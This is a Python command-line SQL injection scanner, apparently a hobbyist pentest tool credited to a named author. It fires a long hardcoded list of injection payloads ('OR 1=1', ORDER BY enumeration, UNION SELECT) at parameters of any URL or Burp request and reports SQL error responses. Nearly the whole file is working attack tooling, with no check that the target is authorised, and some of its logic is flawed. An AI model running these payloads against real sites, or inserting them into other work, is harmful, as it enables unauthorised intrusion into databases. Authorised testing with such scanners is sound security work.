import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

# Banner
print('''\033[92m
  ___  ___  _    ___   ___
 / __|/ _ \\| |  |_ _| / __| __ __ _ _ _  _ _  ___ _ _
 \\__ \\ (_) | |__ | |  \\__ \\/ _/ _` | ' \\| ' \\/ -_) '_|
 |___/\\__\\_\\____|___| |___/\\__\\__,_|_||_|_||_\\___|_| 
        coded by Gaurav Sharma
        Github Page : https://github.com/gaurav-jangid-730
\033[0m
''')

def check_sql_errors(response):
    """Check if response text contains any SQL error messages."""
    sql_errors = [
        "You have an error in your SQL syntax", "Warning: mysql_fetch",
        "Unclosed quotation mark", "SQLSTATE[HY000]", "ORA-01756",
        "syntax error", "invalid input syntax", "SQL syntax", "Query failed", "SQL Error"
    ]
    return any(error in response.text for error in sql_errors)

def send_request(url, payload, method, param=None):
    """Send the request with the payload and check for SQL errors."""
    try:
        if method == "GET":
            response = requests.get(url, params={param: payload} if param else None, timeout=5)
        else:
            data = {param: payload} if param else {"username": payload, "password": "test"}
            response = requests.post(url, data=data, timeout=5)
        
        if response.status_code == 200:
            # Check for SQL errors in the response
            if check_sql_errors(response):
                print(f"\033[91m [+] Vulnerability Detected with Payload: {payload} for Parameter: {param}")
            else:
                print(f"\033[93m [-] No Vulnerability Detected with Payload: {payload} for Parameter: {param}")
        else:
            print(f"\033[94m [!] Received unexpected status code {response.status_code} for Payload: {payload}")

    except requests.exceptions.Timeout:
        print(f"\033[93m [!] Request timed out with payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"\033[91m [!] Error: {e}")

def extract_url_and_params(request_content):
    """Extracts the URL and parameters from the Burp Suite request."""
    with open(request_content, 'r') as file:
        lines = file.readlines()

    request_line = lines[0].strip()
    host_line = next((line for line in lines if line.startswith("Host:")), None)

    if host_line:
        # Determine the protocol from the request line
        if not (request_line.startswith("GET") or request_line.startswith("POST")):
        	# Raise an error if method is unsupported
        	raise ValueError("Unsupported HTTP method in the request. Only GET and POST are supported.")

    	# Determine the protocol based on the presence of "https://" in the request line
        protocol = "https" if "https://" in request_line else "http"

        host = host_line.split(" ")[1].strip()
        path = request_line.split(" ")[1].strip()  # Extract the path from the request line

        # Construct the full URL using the determined protocol
        full_url = f"{protocol}://{host}{path}"

        # Extract parameters from the request body
        params = {}
        for line in lines:
            if line.startswith("Content-Disposition: form-data;"):
                # Match the parameter name and its value
                match = re.search(r'name="([^"]+)"\s+([^-\n]+)', line)
                if match:
                    param_name = match.group(1)
                    param_value = match.group(2).strip()
                    params[param_name] = param_value
        
        return full_url, params
    else:
        raise ValueError("No Host header found in the request.")


def scan(url, method, threads, params, target_param=None):
    """Perform SQL Injection scan on all or a specific parameter with threading."""
    payloads = [
        "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
        "' OR 1 - - -", " OR \"\"= ", " OR 1 = 1 - - -", "' OR '' = '",
        "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
        "1' ORDER BY 1, 2--+", "1' ORDER BY 1, 2, 3--+", "1' GROUP BY 1, 2, --+",
        "1' GROUP BY 1, 2, 3--+", "' GROUP BY columnnames having 1= 1 - -",
        "-1' UNION SELECT 1, 2, 3--+", "OR 1 = 1", "OR 1 = 0",
        "OR 1= 1#", "OR 1 = 0#", "OR 1 = 1--", "OR 1= 0--",
        "HAVING 1 = 1", "HAVING 1= 0", "HAVING 1= 1#",
        "HAVING 1= 0#", "HAVING 1 = 1--", "HAVING 1 = 0--",
        "AND 1= 1", "AND 1= 0", "AND 1 = 1--", "AND 1 = 0--",
        "AND 1= 1#", "AND 1= 0#", "AND 1 = 1 AND '%' ='",
        "AND 1 = 0 AND '%' ='",
        "WHERE 1= 1 AND 1 = 1", "WHERE 1 = 1 AND 1 = 0",
        "WHERE 1 = 1 AND 1 = 1#", "WHERE 1 = 1 AND 1 = 0#",
        "WHERE 1 = 1 AND 1 = 1--", "WHERE 1 = 1 AND 1 = 0--",
        "ORDER BY 1--", "ORDER BY 2--", "ORDER BY 3--",
        "ORDER BY 4--", "ORDER BY 5--", "ORDER BY 6--",
        "ORDER BY 7--", "ORDER BY 8--", "ORDER BY 9--",
        "ORDER BY 10--", "ORDER BY 11--", "ORDER BY 12--",
        "ORDER BY 13--", "ORDER BY 14--", "ORDER BY 15--",
        "ORDER BY 16--", "ORDER BY 17--", "ORDER BY 18--",
        "ORDER BY 19--", "ORDER BY 20--", "ORDER BY 21--",
        "ORDER BY 22--", "ORDER BY 23--", "ORDER BY 24--",
        "ORDER BY 25--", "ORDER BY 26--", "ORDER BY 27--",
        "ORDER BY 28--", "ORDER BY 29--", "ORDER BY 30--",
        "ORDER BY 31337--"
    ]

    print(f"\n[*] Starting SQL Injection Scan on {url} using {method} requests with {threads} threads...\n")
    if target_param:
        print(f"\033[92m [*] Targeting parameter: {target_param}\n")
        params = {target_param: params.get(target_param)}

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_payload = {}
        for param, value in params.items():
            for payload in payloads:
                modified_params = params.copy()
                modified_params[param] = payload
                future = executor.submit(send_request, url, payload, method, param)
                future_to_payload[future] = (param, payload)

        for future in as_completed(future_to_payload):
            param, payload = future_to_payload[future]
            try:
                future.result()
            except Exception as exc:
                print(f"\033[91m [!] Payload {payload} for parameter {param} generated an exception: {exc}")

def main():
    """Main function to prompt user input and start the SQL Injection scan."""
    url = input("\033[92m [*] Enter the URL or path to Burp request file: ").strip()
    if url.endswith('.txt'):  # Treat as Burp request file
        try:
            url, params = extract_url_and_params(url)
            method = "GET" if params else "POST"
        except ValueError as e:
            print(f"\033[91m [!] Error: {e}")
            sys.exit(1)
    else:
        method = input("\033[92m [*] Enter the HTTP method (GET/POST): ").upper()
        if method not in ["GET", "POST"]:
            print("\033[91m Invalid HTTP method. Please use GET or POST.")
            sys.exit(1)
        params_input = input("\033[92m [*] Enter parameters as key=value, separated by & (e.g., param1=value1&param2=value2): ")
        params = dict(param.split('=') for param in params_input.split('&'))

    threads = int(input("\033[92m [*] Enter the number of threads to use: "))
    target_param = input("\033[92m [*] Enter a specific parameter to target (leave blank for all): ").strip() or None

    scan(url, method, threads, params, target_param)

if __name__ == "__main__":
    main()
